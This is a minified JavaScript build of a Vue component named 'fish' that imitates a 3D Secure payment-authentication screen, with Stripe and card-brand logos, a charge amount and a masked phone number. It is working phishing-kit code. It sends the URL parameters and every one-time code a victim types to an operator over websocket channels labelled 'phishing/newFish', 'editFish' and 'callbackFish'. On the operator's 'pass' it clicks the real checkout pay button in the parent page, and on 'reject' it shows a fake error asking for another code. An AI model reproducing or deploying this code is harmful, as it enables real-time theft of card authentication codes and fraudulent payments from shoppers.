import{f as j,g as M,r as l,h as N,i as D,j as T,s as m,k as F,l as I,c as u,o as d,a as e,m as V,n as h,p as x,q as w,v as z,t as y,b,w as p,x as R,T as k,y as U,z as H,d as O,A as q,_ as L}from"./ih_MbC8Y.js";const P={class:"min-h-screen bg-gray-50 flex items-center justify-center p-4"},Y={class:"w-full max-w-[750px] bg-white rounded-lg shadow-lg overflow-hidden"},$={class:"p-4 sm:p-6"},G={class:"space-y-6"},J={class:"space-y-3 pt-2"},X=["disabled"],W=["disabled"],A={class:"pt-4 border-t border-gray-200"},Z={key:0,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},K={key:1,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},Q={class:"overflow-hidden"},ee={class:"bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all"},te={class:"flex flex-col items-center text-center space-y-4"},se={class:"w-full pt-2"},ae="websocket/addons/phishing/newFish",_="websocket/addons/phishing/editFish",oe="websocket/addons/phishing/callbackFish",ne=j({__name:"fish",setup(ie){const r=M(),o=l(!1),c=l(!1),n=l(0),s=l({}),i=l(!1);N(n,a=>{a>0&&setTimeout(()=>{n.value--},1e3)});const S=async()=>{C(),o.value=!0,r.loadStripe()};function C(){s.code!=""&&(s.value.status="checking",m(_,{message:s.value}))}const v=a=>{if(a.data.action=="send")r.unloadStripe();else if(a.data.action=="pass"){o.value=!1,console.log("======真实提交");const t=top.document.getElementById("checkout-pay-button");t.disabled=!1,t.click(),top.window.hack=!1}else(a.data.action=="reject"||a.data.action=="decline")&&(o.value=!1,s.value.code="",i.value=!0,r.unloadStripe());console.log("callBackFish：",a)},B=()=>{s.value.status="resend",s.value.code="",m(_,{message:s.value}),n.value=60,i.value=!1},g=()=>{i.value=!1};return D(async()=>{T(oe,v);const a=Object.fromEntries(new URLSearchParams(window.location.search));a.status="ready",console.log(a),s.value=a,m(ae,{message:s.value})}),F(()=>{I(v)}),(a,t)=>{const E=H;return d(),u("div",P,[e("div",Y,[t[8]||(t[8]=h('<div class="bg-white border-b border-gray-200 p-4 sm:p-6" data-v-bb7a4cce><div class="flex items-center justify-between" data-v-bb7a4cce><div class="flex items-center gap-2 sm:gap-3" data-v-bb7a4cce><img id="shopLogo" src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&amp;ixlib=rb-4.1.0&amp;q=80&amp;w=1080&amp;utm_source=figma&amp;utm_medium=referral" alt="Stripe Pattern" class="h-10 sm:h-12 w-auto rounded" data-v-bb7a4cce></div><div class="flex items-center" data-v-bb7a4cce><img id="bankLogo" src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg" alt="Mastercard ID Check" class="h-10 sm:h-12 w-auto rounded" data-v-bb7a4cce></div></div></div>',1)),e("div",$,[e("div",G,[t[7]||(t[7]=h('<div data-v-bb7a4cce><h2 class="mb-4 text-gray-900" data-v-bb7a4cce>Payment authentication</h2><div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4" data-v-bb7a4cce><div class="text-sm text-gray-600 mb-2" data-v-bb7a4cce>You are authorizing a payment of</div><div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2" data-v-bb7a4cce>$99.00</div><div class="text-sm text-gray-600" data-v-bb7a4cce> to <span id="i-bank" class="font-medium text-gray-900" data-v-bb7a4cce>SecureBank</span> on <span id="i-date" class="font-medium" data-v-bb7a4cce>27/02/24</span></div></div><p class="text-sm sm:text-base text-gray-600" data-v-bb7a4cce> We have sent you a text message with a code to your registered mobile number ending in <span id="i-phone" class="font-medium" data-v-bb7a4cce>**7878</span>. </p></div>',1)),e("form",{onSubmit:x(S,["prevent"]),class:"space-y-4"},[e("div",null,[t[2]||(t[2]=e("label",{for:"otp-code",class:"text-sm sm:text-base text-gray-700 mb-2 block"}," Enter authentication code ",-1)),w(e("input",{id:"otp-code","onUpdate:modelValue":t[0]||(t[0]=f=>s.value.code=f),type:"text",placeholder:"Enter code",maxlength:"8",class:"w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4",required:""},null,512),[[z,s.value.code]])]),e("div",J,[e("button",{type:"submit",disabled:s.value.code?.length!==6||o.value,class:"w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal"},y(o.value?"VERIFYING...":"SUBMIT"),9,X),e("button",{type:"button",onClick:B,disabled:n.value>0,class:"w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal bg-white"},y(n.value>0?`RESEND CODE (${n.value}s)`:"RESEND CODE"),9,W)])],32),e("div",A,[e("button",{onClick:t[1]||(t[1]=f=>c.value=!c.value),class:"flex items-center justify-between w-full py-2 text-left group"},[t[5]||(t[5]=e("span",{class:"text-xs sm:text-sm text-gray-600 group-hover:text-gray-800"}," Why am I seeing this? ",-1)),c.value?(d(),u("svg",Z,[...t[3]||(t[3]=[e("polyline",{points:"6 9 12 15 18 9"},null,-1)])])):(d(),u("svg",K,[...t[4]||(t[4]=[e("polyline",{points:"9 18 15 12 9 6"},null,-1)])]))]),b(k,{name:"expand"},{default:p(()=>[w(e("div",Q,[...t[6]||(t[6]=[e("div",{class:"pb-3 pt-1 text-xs sm:text-sm text-gray-500 leading-relaxed"},[e("p",null," 3D Secure authentication provides an additional layer of security for online transactions. This verification process helps protect your card from unauthorized use by requiring you to enter a one-time password sent to your registered mobile device. ")],-1)])],512),[[R,c.value]])]),_:1})])])])]),(d(),V(q,{to:"body"},[b(k,{name:"modal-fade"},{default:p(()=>[i.value?(d(),u("div",{key:0,class:"fixed inset-0 z-50 flex items-center justify-center p-4 bg-gray-900/40",onClick:x(g,["self"])},[e("div",ee,[e("div",te,[t[10]||(t[10]=e("div",{class:"flex-shrink-0 w-16 h-16 bg-red-100 rounded-full flex items-center justify-center"},[e("svg",{xmlns:"http://www.w3.org/2000/svg",width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"text-red-600","aria-hidden":"true"},[e("circle",{cx:"12",cy:"12",r:"10"}),e("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),e("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})])],-1)),t[11]||(t[11]=e("div",{class:"space-y-2"},[e("h3",{class:"text-lg sm:text-xl font-semibold text-gray-900"}," Verification failed "),e("p",{class:"text-sm sm:text-base text-gray-600 max-w-sm"}," The code you entered is incorrect. Please check your message and try again, or request a new code. ")],-1)),e("div",se,[b(E,{color:"green",size:"lg",block:"",onClick:g,class:"h-12 sm:h-14"},{default:p(()=>[...t[9]||(t[9]=[O(" Try again ",-1)])]),_:1})])])])])):U("",!0)]),_:1})]))])}}}),de=L(ne,[["__scopeId","data-v-bb7a4cce"]]);export{de as default};
